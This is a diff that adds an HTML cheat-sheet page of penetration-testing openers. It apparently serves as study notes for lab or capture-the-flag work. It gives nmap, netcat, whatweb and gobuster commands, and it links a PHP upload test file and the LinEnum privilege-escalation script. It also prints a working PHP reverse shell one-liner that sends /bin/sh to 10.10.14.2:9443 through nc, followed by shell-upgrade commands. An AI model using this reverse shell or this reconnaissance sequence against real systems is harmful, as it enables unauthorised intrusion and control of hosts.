@@ -1,0 +1,256 @@
+<h1 id="pentest-opening">Pentest opening<a aria-hidden="true" class="anchor-heading icon-link" href="#pentest-opening"></a></h1>
+<h2 id="nmap">Nmap:<a aria-hidden="true" class="anchor-heading icon-link" href="#nmap"></a></h2>
+<h3 id="nmap-man-pages"><a href="https://linux.die.net/man/1/nmap">Nmap man pages</a><a aria-hidden="true" class="anchor-heading icon-link" href="#nmap-man-pages"></a></h3>
+<table>
+<tbody><tr><th>Function</th><th>Examples:</th></tr>
+<tr><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Flag:</th><th>What it does:</th></tr></thead><tbody><tr><td><code>-sV</code></td><td>scan against the default top 1000 ports</td></tr><tr><td><code>--open</code></td><td>scan only open ports</td></tr><tr><td><code>-oA &#x3C;filename></code></td><td>output all scan formats</td></tr><tr><td><code>-v</code></td><td>verbose output</td></tr><tr><td><code>-p-</code></td><td>full TCP port scan (65535)</td></tr><tr><td><code>--script=&#x3C;script_name></code></td><td>script scan</td></tr><tr><td><li><code>banner</code></li></td><td>A simple banner grabber which connects <br>to an open TCP port and prints out anything <br>sent by the listening service within five seconds</td></tr><tr><td><li><code>http-enum</code></li></td><td>Enumerates directories used by <br>popular web applications and servers</td></tr></tbody></table></div>
+</td><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Full command:</th></tr></thead><tbody><tr><td><code>nmap -sV --open -oA &#x3C;filename> &#x3C;ip address></code></td></tr><tr><td><strong>Quick scan</strong></td></tr><tr><td><code>nmap -p- --open -oA &#x3C;filename> &#x3C;ip address></code></td></tr><tr><td><strong>Long scan - recommended in second terminal</strong></td></tr></tbody></table></div>
+</td></tr> </tbody></table>
+<h2 id="netcat">NetCat<a aria-hidden="true" class="anchor-heading icon-link" href="#netcat"></a></h2>
+<h3 id="netcat-man-pages"><a href="https://linux.die.net/man/1/nc">NetCat man pages</a><a aria-hidden="true" class="anchor-heading icon-link" href="#netcat-man-pages"></a></h3>
+<table>
+<tbody><tr><th>Function</th><th>Examples:</th></tr>
+<tr><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Flag:</th><th>What it does:</th></tr></thead><tbody><tr><td><code>-n</code></td><td>do not do any DNS or service lookups on any specified addresses, <br>hostnames and ports (don't resolve)</td></tr><tr><td><code>-v</code></td><td>verbose</td></tr><tr><td><code>-l</code></td><td>listen for incoming connection rather than initiate a connection</td></tr></tbody></table></div>
+</td><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Full command:</th></tr></thead><tbody><tr><td><code>nc -nv &#x3C;ip address> &#x3C;port></code></td></tr><tr><td>Confirm banner</td></tr><tr><td><code>nc -nvlp 80</code></td></tr><tr><td>Listening shell on port 80</td></tr></tbody></table></div>
+</td></tr> </tbody></table>
+<h2 id="whatweb">whatweb<a aria-hidden="true" class="anchor-heading icon-link" href="#whatweb"></a></h2>
+<h3 id="whatweb-man-pages"><a href="https://manpages.org/whatweb">whatweb man pages</a><a aria-hidden="true" class="anchor-heading icon-link" href="#whatweb-man-pages"></a></h3>
+<table>
+<tbody><tr><th>Function</th><th>Examples:</th></tr>
+<tr><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Flag:</th><th>What it does:</th></tr></thead><tbody><tr><td>``</td><td></td></tr><tr><td>``</td><td></td></tr></tbody></table></div>
+</td><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Full command:</th></tr></thead><tbody><tr><td><code>whatweb &#x3C;ip address></code></td></tr><tr><td>Identify web application in use</td></tr></tbody></table></div>
+</td></tr> </tbody></table>
+<h2 id="gobuster">Gobuster<a aria-hidden="true" class="anchor-heading icon-link" href="#gobuster"></a></h2>
+<h3 id="gobuster-man-pages"><a href="https://linuxcommandlibrary.com/man/gobuster">Gobuster man pages</a><a aria-hidden="true" class="anchor-heading icon-link" href="#gobuster-man-pages"></a></h3>
+<table>
+<tbody><tr><th>Function</th><th>Examples:</th></tr>
+<tr><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Flag:</th><th>What it does:</th></tr></thead><tbody><tr><td><code>dir</code></td><td>use directory enumeration mode</td></tr><tr><td><code>-u</code></td><td>string, the target URL or Domain</td></tr><tr><td><code>--wordlist</code> / <code>-w</code></td><td>path to wordlist, recommended:<br> <code>/usr/share/wordlists/dirb/common.txt</code></td></tr><tr><td><code>-e</code></td><td>print full URLs</td></tr></tbody></table></div>
+</td><td>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Full command:</th></tr></thead><tbody><tr><td><code>gobuster -e -u &#x3C;ip address/URL> -w /usr/share/wordlists/dirb/common.txt</code></td></tr><tr><td>Scan website, use common.txt wordlist and print the full <br>URLs of discovered paths</td></tr></tbody></table></div>
+</td></tr> </tbody></table>
+<h2 id="file-upload-testing">File upload testing<a aria-hidden="true" class="anchor-heading icon-link" href="#file-upload-testing"></a></h2>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>File:</th><th>What it does/testing:</th></tr></thead><tbody><tr><td><a href="/Notes/assets/files/test_php.php">test_php.php</a></td><td>Tests if php file can be uploaded to web app</td></tr></tbody></table></div>
+<h2 id="reverse-shells">Reverse shells:<a aria-hidden="true" class="anchor-heading icon-link" href="#reverse-shells"></a></h2>
+<pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&#x3C;?php</span> <span class="token function">system</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&#x26;1|nc 10.10.14.2 9443 >/tmp/f"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> 
+</code></pre>
+<h2 id="upgrade-reverse-shell">Upgrade reverse shell<a aria-hidden="true" class="anchor-heading icon-link" href="#upgrade-reverse-shell"></a></h2>
+<pre class="language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre>
+<p>OR</p>
+<pre class="language-python"><code class="language-python">python3 <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre>
+<h2 id="privilege-escalation-checks">Privilege escalation checks<a aria-hidden="true" class="anchor-heading icon-link" href="#privilege-escalation-checks"></a></h2>
+<div class="table-responsive">
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>File:</th><th>What it does/testing:</th></tr></thead><tbody><tr><td><a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</a></td><td>Automated privilege escalation checks</td></tr></tbody></table></div>
+<h2 id="start-python-http-server">Start Python HTTP server<a aria-hidden="true" class="anchor-heading icon-link" href="#start-python-http-server"></a></h2>
+<pre class="language-python"><code class="language-python">sudo python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">8080</span>
+</code></pre>
+<hr>
+<strong>Backlinks</strong>
+<ul>
+<li><a href="/Notes/notes/t7zelcb6b17opo2gjy4y9cq">Cheat Sheets:</a></li>
+</ul>
